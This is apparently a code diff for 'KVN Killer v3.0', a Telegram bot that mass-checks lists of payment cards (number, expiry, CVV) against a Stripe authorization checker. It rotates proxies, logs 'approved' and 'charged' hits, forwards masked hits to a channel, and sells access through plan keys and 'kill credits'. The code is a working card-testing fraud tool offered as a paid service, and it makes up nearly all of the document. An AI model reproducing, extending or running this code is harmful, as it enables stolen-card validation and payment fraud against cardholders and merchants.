+            start_card = time.time()
+
+            try:
+                async with aiohttp.ClientSession() as session:
+                    result = await StripeChecker.check(card, mm, yy, cvv, session, purl)
+            except Exception as e:
+                result = {"status": "ERROR", "response": str(e)[:60],
+                          "amount": "0", "gateway": "Stripe Auth"}
+
+            elapsed_card = round(time.time() - start_card, 2)
+
+            async with state.lock:
+                state.checked += 1
+                state.last_response = result["response"][:60]
+                if result["status"] == "APPROVED":
+                    state.approved += 1
+                    state.hits.append((card, mm, yy, cvv, result, elapsed_card))
+                elif result["status"] == "CHARGED":
+                    state.charged += 1
+                    state.hits.append((card, mm, yy, cvv, result, elapsed_card))
+                else:
+                    state.declined += 1
+
+            if proxy and result.get("status") == "ERROR":
+                proxy_rotator.mark_failed(proxy["url"])
+
+    async def progress_updater():
+        while not state.stopped and state.checked < state.total:
+            await asyncio.sleep(3)
+            try:
+                await state.msg.edit_text(
+                    format_mass_progress(state.to_dict()), parse_mode=ParseMode.HTML)
+            except:
+                pass
+
+    tasks = [asyncio.create_task(worker(line)) for line in lines]
+    updater = asyncio.create_task(progress_updater())
+    await asyncio.gather(*tasks)
+    state.stopped = True
+    try:
+        updater.cancel()
+    except:
+        pass
+
+    await state.msg.edit_text(
+        format_mass_summary(state.to_dict()), parse_mode=ParseMode.HTML)
+
+    for card, mm, yy, cvv, result, elapsed in state.hits:
+        async with aiohttp.ClientSession() as s:
+            bin_info = await bin_lookup(card, s, None)
+        hit_text = format_mass_hit(card, mm, yy, cvv, result, bin_info, elapsed,
+                                    u.username or u.first_name or "User")
+        try:
+            await update.message.reply_text(hit_text, parse_mode=ParseMode.HTML)
+        except:
+            pass
+
+        masked = f"{card[:6]}XXXXXXXXXX|XX|XX|XXX"
+        chan_text = format_channel_hit(u.username or u.first_name or "User", masked, result)
+        try:
+            await context.bot.send_message(HIT_CHANNEL_ID, chan_text, parse_mode=ParseMode.HTML)
+        except Exception as e:
+            logger.error(f"Channel forward failed: {e}")
+
+    if u.id in mass_stop_events:
+        del mass_stop_events[u.id]
+
+async def stop_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    u = update.effective_user
+    if u.id in mass_stop_events:
+        mass_stop_events[u.id].stopped = True
+        await update.message.reply_text("⏹️ Stopping mass check...")
+    else:
+        await update.message.reply_text("No active mass check.")
+
+async def plan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    u = update.effective_user
+    user_db.ensure_user(u.id, u.username or "", u.first_name or "")
+    await update.message.reply_text(format_plan(u.id), parse_mode=ParseMode.HTML)
+
+async def mystats(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    u = update.effective_user
+    user_db.ensure_user(u.id, u.username or "", u.first_name or "")
+    user = user_db.get_user(u.id)
+    await update.message.reply_text(
+        f"{box_title('📊 YOUR STATS 📊')}\n\n"
+        f"🔍 𝗖𝗵𝗲𝗰𝗸𝘀   ▸ <code>{user['check_count']}</code>\n"
+        f"💀 𝗞𝗶𝗹𝗹𝘀    ▸ <code>{user['kill_count']}</code>\n"
+        f"💰 𝗖𝗿𝗲𝗱𝗶𝘁𝘀  ▸ <code>{user['kill_credits']}</code>\n"
+        f"👑 𝗣𝗹𝗮𝗻     ▸ <b>{'✅ Active' if user_db.has_active_plan(u.id) else '❌ Inactive'}</b>\n"
+        f"{sep_mini()}",
+        parse_mode=ParseMode.HTML)
+
+async def add_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("⛔ Owner only.")
+        return
+    text = update.message.text
+    lines = text.split("\n")[1:] if "\n" in text else context.args
+    if not lines:
+        await update.message.reply_text(
+            f"Send proxies after the command:\n"
+            f"<code>/proxy\nip:port\nhost:port:user:pass</code>",
+            parse_mode=ParseMode.HTML)
+        return
+    added = 0
+    for line in lines:
+        line = line.strip()
+        if line and proxy_rotator.add(line):
+            added += 1
+    await update.message.reply_text(
+        f"✅ Added <b>{added}</b> proxies.", parse_mode=ParseMode.HTML)
+
+async def list_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("⛔ Owner only.")
+        return
+    proxies = proxy_rotator.list_all()
+    if not proxies:
+        await update.message.reply_text("No proxies in database.")
+        return
+    msg = f"{box_title('🌐 PROXIES 🌐')}\n\n"
+    for idx, p in enumerate(proxies[:20]):
+        status = "🟢" if p.get("is_active") else "🔴"
+        msg += f"{idx}. <code>{p['proxy_string']}</code> {status} ({p.get('fail_count',0)})\n"
+    if len(proxies) > 20:
+        msg += f"... and {len(proxies)-20} more\n"
+    msg += sep_mini()
+    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
+
+async def del_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("⛔ Owner only.")
+        return
+    if not context.args:
+        await update.message.reply_text(
+            f"Usage: <code>/delproxy &lt;index&gt;</code>", parse_mode=ParseMode.HTML)
+        return
+    try:
+        idx = int(context.args[0])
+        if proxy_rotator.delete_by_index(idx):
+            await update.message.reply_text(f"✅ Proxy at index {idx} deleted.")
+        else:
+            await update.message.reply_text("❌ Invalid index.")
+    except ValueError:
+        await update.message.reply_text("Index must be a number.")
+
+async def addcredits(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("⛔ Owner only.")
+        return
+    if len(context.args) != 2:
+        await update.message.reply_text(
+            f"Usage: <code>/addcredits user_id amount</code>", parse_mode=ParseMode.HTML)
+        return
+    try:
+        target_id = int(context.args[0])
+        amount = int(context.args[1])
+        if amount <= 0:
+            await update.message.reply_text("Amount must be positive.")
+            return
+        user_db.ensure_user(target_id)
+        user_db.add_kill_credits(target_id, amount)
+        await update.message.reply_text(
+            f"✅ Added <b>{amount}</b> credits to <code>{target_id}</code>",
+            parse_mode=ParseMode.HTML)
+        try:
+            await context.bot.send_message(target_id,
+                f"💰 <b>{amount}</b> kill credits added to your account!",
+                parse_mode=ParseMode.HTML)
+        except: pass
+    except ValueError:
+        await update.message.reply_text("Invalid args.")
+
+async def credits_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    credits = user_db.get_credits(user_id)
+    await update.message.reply_text(
+        f"{box_title('💰 CREDITS 💰')}\n\n"
+        f"💰 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 ▸ <code>{credits}</code>\n{sep_mini()}",
+        parse_mode=ParseMode.HTML)
+
+async def ban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("⛔ Owner only.")
+        return
+    if not context.args:
+        await update.message.reply_text("Usage: <code>/ban user_id</code>", parse_mode=ParseMode.HTML)
+        return
+    try:
+        target = int(context.args[0])
+        user_db.ensure_user(target)
+        user_db.ban(target)
+        await update.message.reply_text(f"🚫 Banned <code>{target}</code>", parse_mode=ParseMode.HTML)
+    except ValueError:
+        await update.message.reply_text("Invalid user_id.")
+
+async def unban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("⛔ Owner only.")
+        return
+    if not context.args:
+        await update.message.reply_text("Usage: <code>/unban user_id</code>", parse_mode=ParseMode.HTML)
+        return
+    try:
+        target = int(context.args[0])
+        user_db.unban(target)
+        await update.message.reply_text(f"✅ Unbanned <code>{target}</code>", parse_mode=ParseMode.HTML)
+    except ValueError:
+        await update.message.reply_text("Invalid user_id.")
+
+async def grant(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("⛔ Owner only.")
+        return
+    if len(context.args) != 2:
+        await update.message.reply_text("Usage: <code>/grant user_id days</code>", parse_mode=ParseMode.HTML)
+        return
+    try:
+        target, days = int(context.args[0]), int(context.args[1])
+        user_db.ensure_user(target)
+        user_db.add_plan_days(target, days)
+        await update.message.reply_text(
+            f"✅ Granted <b>{days}</b> days to <code>{target}</code>",
+            parse_mode=ParseMode.HTML)
+        try:
+            await context.bot.send_message(target,
+                f"👑 <b>{days}</b> days added to your plan!",
+                parse_mode=ParseMode.HTML)
+        except: pass
+    except ValueError:
+        await update.message.reply_text("Invalid args.")
+
+async def grantkiller(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("⛔ Owner only.")
+        return
+    if len(context.args) != 2:
+        await update.message.reply_text(
+            f"Usage: <code>/grantkiller user_id credits</code>", parse_mode=ParseMode.HTML)
+        return
+    try:
+        target, creds = int(context.args[0]), int(context.args[1])
+        user_db.ensure_user(target)
+        user_db.add_kill_credits(target, creds)
+        await update.message.reply_text(
+            f"✅ Granted <b>{creds}</b> kill credits to <code>{target}</code>",
+            parse_mode=ParseMode.HTML)
+    except ValueError:
+        await update.message.reply_text("Invalid args.")
+
+async def keygen(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("⛔ Owner only.")
+        return
+    if len(context.args) < 1:
+        await update.message.reply_text(
+            f"Usage: <code>/keygen days [count]</code>", parse_mode=ParseMode.HTML)
+        return
+    try:
+        days = int(context.args[0])
+        count = int(context.args[1]) if len(context.args) > 1 else 1
+        count = min(count, 50)
+        keys = [user_db.gen_key(days) for _ in range(count)]
+        await update.message.reply_text(
+            f"🔑 Generated <b>{count}</b> key(s) — <b>{days}</b> days each:\n\n<code>" +
+            "\n".join(keys) + "</code>",
+            parse_mode=ParseMode.HTML)
+    except ValueError:
+        await update.message.reply_text("Invalid args.")
+
+async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args:
+        await update.message.reply_text("Usage: <code>/redeem KEY</code>", parse_mode=ParseMode.HTML)
+        return
+    key = context.args[0].strip()
+    days = user_db.redeem_key(key, update.effective_user.id)
+    if days:
+        user = user_db.get_user(update.effective_user.id)
+        await update.message.reply_text(
+            f"{box_title('✅ KEY REDEEMED ✅')}\n\n"
+            f"📅 𝗗𝗮𝘆𝘀    ▸ <b>{days}</b>\n"
+            f"⏱️ 𝗘𝘅𝗽𝗶𝗿𝗲𝘀 ▸ <code>{user['plan_expiry'][:10]}</code>\n"
+            f"{sep_mini()}\n"
+            f"🔥 Unlimited access while active!",
+            parse_mode=ParseMode.HTML)
+    else:
+        await update.message.reply_text("❌ Invalid or already redeemed key.")
+
+async def banlist(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("⛔ Owner only.")
+        return
+    rows = user_db._exec("SELECT user_id, username FROM users WHERE is_banned = 1")
+    if not rows:
+        await update.message.reply_text("No banned users.")
+        return
+    msg = f"{box_title('🚫 BANLIST 🚫')}\n\n"
+    for r in rows:
+        msg += f"• <code>{r[0]}</code> — {r[1] or 'N/A'}\n"
+    msg += sep_mini()
+    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
+
+async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("⛔ Owner only.")
+        return
+    if not context.args:
+        await update.message.reply_text("Usage: <code>/broadcast your message</code>", parse_mode=ParseMode.HTML)
+        return
+    message = " ".join(context.args)
+    rows = user_db._exec("SELECT user_id FROM users WHERE is_banned = 0")
+    sent, failed = 0, 0
+    progress = await update.message.reply_text(
+        f"📢 Broadcasting to {len(rows)} users...\n✅ {sent} | ❌ {failed}",
+        parse_mode=ParseMode.HTML)
+    for row in rows:
+        try:
+            await context.bot.send_message(row[0],
+                f"📢 <b>BROADCAST</b>\n\n{message}", parse_mode=ParseMode.HTML)
+            sent += 1
+        except:
+            failed += 1
+        if (sent + failed) % 10 == 0:
+            try:
+                await progress.edit_text(
+                    f"📢 Broadcasting to {len(rows)} users...\n✅ {sent} | ❌ {failed}",
+                    parse_mode=ParseMode.HTML)
+            except: pass
+        await asyncio.sleep(0.05)
+    await progress.edit_text(
+        f"{box_title('📢 BROADCAST DONE 📢')}\n\n"
+        f"✅ 𝗦𝗲𝗻𝘁   ▸ <code>{sent}</code>\n"
+        f"❌ 𝗙𝗮𝗶𝗹𝗲𝗱 ▸ <code>{failed}</code>\n"
+        f"👥 𝗧𝗼𝘁𝗮𝗹 ▸ <code>{len(rows)}</code>\n{sep_mini()}",
+        parse_mode=ParseMode.HTML)
+
+async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("⛔ Owner only.")
+        return
+    s = user_db.get_stats()
+    active_u = user_db._exec("SELECT COUNT(*) FROM users WHERE is_banned = 0")[0][0]
+    banned_u = user_db._exec("SELECT COUNT(*) FROM users WHERE is_banned = 1")[0][0]
+    with_plan = user_db._exec("SELECT COUNT(*) FROM users WHERE plan_expiry IS NOT NULL AND plan_expiry > ?",
+                               (datetime.now().isoformat(),))[0][0]
+    total_kills = user_db._exec("SELECT SUM(kill_count) FROM users")[0][0] or 0
+    total_credits = user_db._exec("SELECT SUM(kill_credits) FROM users")[0][0] or 0
+    pa = proxy_rotator.count_active()
+    pt = proxy_rotator.count_total()
+    await update.message.reply_text(
+        f"{box_title('📊 BOT STATS 📊')}\n\n"
+        f"👥 𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿𝘀  ▸ <code>{s['users']}</code>\n"
+        f"✅ 𝗔𝗰𝘁𝗶𝘃𝗲      ▸ <code>{active_u}</code>\n"
+        f"🚫 𝗕𝗮𝗻𝗻𝗲𝗱    ▸ <code>{banned_u}</code>\n"
+        f"👑 𝗪𝗶𝘁𝗵 𝗣𝗹𝗮𝗻   ▸ <code>{with_plan}</code>\n"
+        f"{sep_mid()}\n"
+        f"🔍 𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗲𝗰𝗸𝘀 ▸ <code>{s['checks']}</code>\n"
+        f"💎 𝗟𝗶𝘃𝗲𝘀      ▸ <code>{s['lives']}</code>\n"
+        f"💀 𝗧𝗼𝘁𝗮𝗹 𝗞𝗶𝗹𝗹𝘀 ▸ <code>{total_kills}</code>\n"
+        f"💰 𝗖𝗿𝗲𝗱𝗶𝘁𝘀    ▸ <code>{total_credits}</code>\n"
+        f"{sep_mid()}\n"
+        f"🌐 𝗣𝗿𝗼𝘅𝗶𝗲𝘀    ▸ <code>{pa}/{pt}</code> active\n"
+        f"{sep_mini()}",
+        parse_mode=ParseMode.HTML)
+
+async def reload_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("⛔ Owner only.")
+        return
+    if proxy_rotator.active:
+        proxy_rotator.coll.update_many({"fail_count": {"$lt": 5}},
+                                       {"$set": {"is_active": True}})
+        count = proxy_rotator.count_active()
+        await update.message.reply_text(
+            f"{box_title('🔄 RELOADED 🔄')}\n\n"
+            f"🌐 𝗔𝗰𝘁𝗶𝘃𝗲 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ▸ <code>{count}</code>\n{sep_mini()}",
+            parse_mode=ParseMode.HTML)
+    else:
+        await update.message.reply_text("❌ MongoDB not connected.")
+
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    document = update.message.document
+    if not document or not document.file_name.endswith(".txt"):
+        return
+    await mst(update, context)
+
+async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
+    logger.error(f"Exception: {context.error}", exc_info=context.error)
+
+# ═══════════════════════════════════════
+# RAILWAY HEALTH CHECK SERVER
+# ═══════════════════════════════════════
+async def health_check(request):
+    return web.Response(text="OK")
+
+def run_health_server():
+    app_web = web.Application()
+    app_web.router.add_get('/', health_check)
+    web.run_app(app_web, port=int(os.environ.get("PORT", 8080)))
+
+# ═══════════════════════════════════════
+# MAIN
+# ═══════════════════════════════════════
+def main():
+    app = Application.builder().token(BOT_TOKEN).build()
+
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("menu", start))
+    app.add_handler(CommandHandler("help", start))
+    app.add_handler(CommandHandler("chk", chk))
+    app.add_handler(CommandHandler("check", chk))
+    app.add_handler(CommandHandler("kill", kill))
+    app.add_handler(CommandHandler("mst", mst))
+    app.add_handler(CommandHandler("mass", mst))
+    app.add_handler(CommandHandler("stop", stop_mass))
+    app.add_handler(CommandHandler("plan", plan_cmd))
+    app.add_handler(CommandHandler("mystats", mystats))
+    app.add_handler(CommandHandler("credits", credits_cmd))
+    app.add_handler(CommandHandler("redeem", redeem))
+
+    app.add_handler(CommandHandler("proxy", add_proxy))
+    app.add_handler(CommandHandler("proxies", list_proxies))
+    app.add_handler(CommandHandler("delproxy", del_proxy))
+
+    app.add_handler(CommandHandler("ban", ban_cmd))
+    app.add_handler(CommandHandler("unban", unban_cmd))
+    app.add_handler(CommandHandler("banlist", banlist))
+    app.add_handler(CommandHandler("grant", grant))
+    app.add_handler(CommandHandler("grantkiller", grantkiller))
+    app.add_handler(CommandHandler("addcredits", addcredits))
+    app.add_handler(CommandHandler("keygen", keygen))
+    app.add_handler(CommandHandler("broadcast", broadcast))
+    app.add_handler(CommandHandler("stats", stats))
+    app.add_handler(CommandHandler("reload", reload_cmd))
+
+    app.add_handler(CallbackQueryHandler(button_callback))
+    app.add_handler(MessageHandler(filters.Document.ALL & ~filters.COMMAND, handle_document))
+    app.add_error_handler(error_handler)
+
+    logger.info("═══════════════════════════════════════")
+    logger.info("  ⚡ KVN Killer v3.0 — Ultra Edition")
+    logger.info("  Premium UI · Inline Keyboards · Railway")
+    logger.info("═══════════════════════════════════════")
+
+    app.run_polling(drop_pending_updates=True)
+
+if __name__ == "__main__":
+    port = os.environ.get("PORT")
+    if port:
+        threading.Thread(target=run_health_server, daemon=True).start()
+
+    logger.info("Starting KVN Killer v3.0...")
+    main()
